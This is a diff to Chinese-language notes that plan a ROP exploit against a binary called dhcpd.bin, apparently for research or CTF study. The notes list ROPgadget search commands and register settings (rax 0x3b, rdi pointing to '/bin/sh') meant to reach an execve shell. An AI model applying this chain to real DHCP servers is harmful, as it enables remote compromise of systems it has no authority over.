@@ -1,13 +1,14 @@
 ## 任意写
 向任意内存地址rw写入内容"/bin/sh"，然后调用sys。
 
-需要寻找往内存中写入数据的gadget
+需要寻找往内存中写入数据的gadget（mov）,然后查找控制寄存器的值的gadget
 ```
 ROPgadget --binary dhcpd.bin --only "mov|ret"
-ROPgadget --binary dhcpd.bin | grep -v "jmp" | grep "mov"
+ROPgadget --binary dhcpd.bin --only "mov|pop|ret"
+ROPgadget --binary dhcpd.bin | grep -v "jmp" | grep "mov qword"
 ```
 
-调用sys
+调用sys（设置参数rdi）
 ```
 ROPgadget --binary dhcpd.bin --only "pop|ret" | grep "rdi"
 ```
@@ -18,6 +19,7 @@ ROPgadget --binary dhcpd.bin --only "pop|ret" | grep "rdi"
 `rsi`:0
 `rdx`:0
 `rax`:0x3b
+寻找syscall指令地址
 
 ```
 ROPgadget --binary dhcpd.bin --only "pop|ret" | grep "rsi"
@@ -33,11 +35,12 @@ rdi, rsi, rdx, rcx, r8, r9 或ecx
 ROPgadget --binary dhcpd.bin --only "pop|ret" | grep "rcx"
 ROPgadget --binary dhcpd.bin --only "mov|pop|ret" | grep "rcx"
 ROPgadget --binary dhcpd.bin | grep -v "jmp" | grep "ret" | grep "r8"
-xchg
+ROPgadget --binary dhcpd.bin | grep -v "jmp" | grep "ret" | grep "xchg" | grep "r8"
+
 
 ```
 
-设置可控参数，然后调用check_argv
+设置可控参数，然后调用check_argv(返回到那个地址)
 
 | register | value    |
 | -------- | -------- |
